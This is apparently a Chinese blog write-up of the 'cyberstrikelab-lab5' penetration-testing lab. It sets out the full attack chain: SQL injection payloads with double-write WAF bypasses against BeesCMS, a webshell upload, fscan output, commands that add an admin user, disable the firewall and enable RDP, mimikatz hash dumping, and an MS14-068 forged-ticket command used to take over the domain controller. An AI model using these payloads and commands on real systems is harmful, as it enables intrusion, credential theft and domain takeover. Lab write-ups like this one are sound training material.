+++
series = ["内网渗透 学习记录"]
categories = ["Web安全", "内网渗透", "域渗透"]
tags = ["Web安全", "内网渗透", "域渗透"]
description = "靶机"
title = "cyberstrikelab-lab5"
date = 2026-08-24T09:16:04+08:00
draft = false
pin = false
+++

重生之我是redteam人员，对某境外公司进行渗透测试。

```c
（1）端口扫描发现存在beescms框架
（2）利用sql注入nday拿到账号密码
（3）利用文件上传nday拿shell
（4）蚁剑进行连接，上线c2服务器（拿下192.168.10.10）
（5）上传fscan进行信息收集
（6）发现存在2个段，192.168.10.0段和192.168.20.0段
（7）扫描20段，发现存活20，和30的机器，其中20的机器存在jboss
（8）创建路由，搭建socks代理
（9）对10的机器进行添加用户，管理员组，关防火墙，开启远程桌面等等
（10）远程桌面登录192.168.10.10机器，通过此机器去打jboss（20.20）的机器（通过socks代理打jboss机器容易挂）
（11）对20.20机器添加用户，管理员组，关闭防火墙，开启远程桌面（拿下192.168.20.20）
（12）远程桌面登录20.20机器，上传ms14_068和mimikatz，做ptt攻击
（13）首先mimikaz脱hash，拿到该机器账号密码，去注册表看机器账号的sid
（14）利用ms14_068生成高权限的票据
（15）利用mimikatz进行ptt攻击（192.168.20.30）
```

# flag1

扫描端口   

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712182840163.png)

发现    beescms

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712182902378.png)

搜索nday  发现后台存在sql注入

```c
http://192.168.10.10:6582/admin/login.php
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712183000827.png)

经过测试存在waf 咱们采用双写进行绕过

```c
admin' order by 5--+
# and 被过滤
admin' and updatexml(1,concat(0x7e,select database(),0x7e),1)--+ 
# 去掉前面的空格
admin'and updatexml(1,concat(0x7e,select database(),0x7e),1)--+ 

# 报错信息如下，数据库名beescms
操作数据库失败XPATH syntax error: '~，beescms~'<br>sql:select id,admin_name,admin_password,admin_purview,is_disable from bees_admin where admin_name='admin'and updatexml(1,concat(0x7e, database(),0x7e),1)--  ' limit 0,1


# 其他双写绕过
union => uni union on
select => selselectect
from => fr from om
where => wh where ere


# 列1 admin_name
admin'a and nd updatexml(1,concat(0x7e,(seselectlect column_name fr from om information_schema.columns wh where ere table_name like 'bees_admin' limit 1,1),0x7e),1)#

# 列2 admin_password
admin'a and nd updatexml(1,concat(0x7e,(seselectlect column_name fr from om information_schema.columns wh where ere table_name like 'bees_admin' limit 2,1),0x7e),1)#

# 字段1 admin
admin'a and nd updatexml(1,concat(0x7e,(seselectlect admin_name fr from om beescms.bees_admin limit 0,1),0x7e),1)#

# 字段2 7e60bc642fefc11b43792e8745df6c1  // cmd5.com 解密 cyber
admin'a and nd updatexml(1,concat(0x7e,(seselectlect admin_password fr from om beescms.bees_admin limit 0,1),0x7e),1)#
```

获取到后台账户密码是   admin  cyber  进行登录

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712183611864.png)

然后后台有个rce  修改系统设置  允许上传 php

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712183731821.png)

访问url：[http://192.168.10.10:6582/admin/admin_file_upload.php](http://192.168.10.10:6582/admin/admin_file_upload.php) 进行上传

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712183950149.png)

蚁剑连接

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712184054509.png)


获取flag1

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712184112125.png)


go-flag{AT3yTHss1RX9QNPQ}


# flag2

上线 vshell

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712184314024.png)

信息收集  发现 10 主机 最高权限 存在双网卡 10段 20 段 且在工作组里

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712184412470.png)

上传 fscan 对 20网段进行扫描

```c
C:\phpstudy_pro\WWW\upload\file>fscan.exe -h 192.168.20.0/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
(icmp) Target 192.168.20.10   is alive
(icmp) Target 192.168.20.20   is alive
(icmp) Target 192.168.20.30   is alive
[*] Icmp alive hosts len is: 3
192.168.20.30:445 open
192.168.20.20:445 open
192.168.20.20:135 open
192.168.20.10:135 open
192.168.20.20:8009 open
192.168.20.10:7680 open
192.168.20.30:88 open
192.168.20.20:8080 open
192.168.20.10:3306 open
192.168.20.10:445 open
192.168.20.30:139 open
192.168.20.20:139 open
192.168.20.10:139 open
192.168.20.30:135 open
[*] alive ports len is: 14
start vulscan
[*] NetInfo
[*]192.168.20.30
   [->]WIN-7NRTJO59O7N
   [->]192.168.20.30
[*] NetInfo
[*]192.168.20.20
   [->]cyberweb
   [->]192.168.20.20
[*] NetBios 192.168.20.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600
[*] WebTitle http://192.168.20.20:8080 code:200 len:1554   title:Welcome to JBoss AS
[+] InfoScan http://192.168.20.20:8080 [Jboss] 
已完成 14/14
[*] 扫描结束,耗时: 18.6801576s
```

由扫描结果可知
（1）20.20和20.30机器开放
（2）30为域控（开放了80端口）
（3）20存在jboss漏洞

开启socks 代理 （前面的有写过）

访问  jboss

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712185129251.png)
然后 nday 获取flag

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712185301645.png)


获取到flag

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712185332971.png)

go-flag{9WJuRxX0td5NwXM3}

# flag3


然后这里需要拿到 30 的权限

先在20主机上面权限维持，然后再拿工具横向30的

```c
net user zcx 123@abc /add
net localgroup Administrators zcx /add
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
netsh advfirewall set allprofiles state off
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712185905557.png)

然后远程连接

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712190049297.png)

经过测试可知，存在 ms14-068 漏洞   

上传ms14-068.exe和mimikatz进行pth攻击

获取到主机信息  WIN-7NRTJO59O7N  

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712191555180.png)

先查看 sid  必须是机器自己的 sid

路径在

```c
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712192114701.png)

通过 mimikatz 进行抓取 hash

获取机器账户的 hash

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712193141284.png)


然后使用命令

```c
ms14-068.exe -u CYBERWEB$@cyberstrikelab.com -s S-1-5-21-3614065708-1162526928-2578637-1104 -d 192.168.20.30 --rc4 ee8ef4e5efa5d56d63c1eb967bdad433
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712194441372.png)

通过  mimikatz  将伪造出来的TGT注入票证  

```c
.\mimikatz.exe "kerberos::ptc TGT_cyberweb$@cyberstrikelab.com.ccache" "exit"
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712195057423.png)


然后就可以横向获取域内的 30 主机的 flag  

```c
Get-Content -Path "\\WIN-7NRTJO59O7N\C$\flag.txt"
```


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260712195510840.png)


go-flag{Cfg8hlBj4dXppo5j}




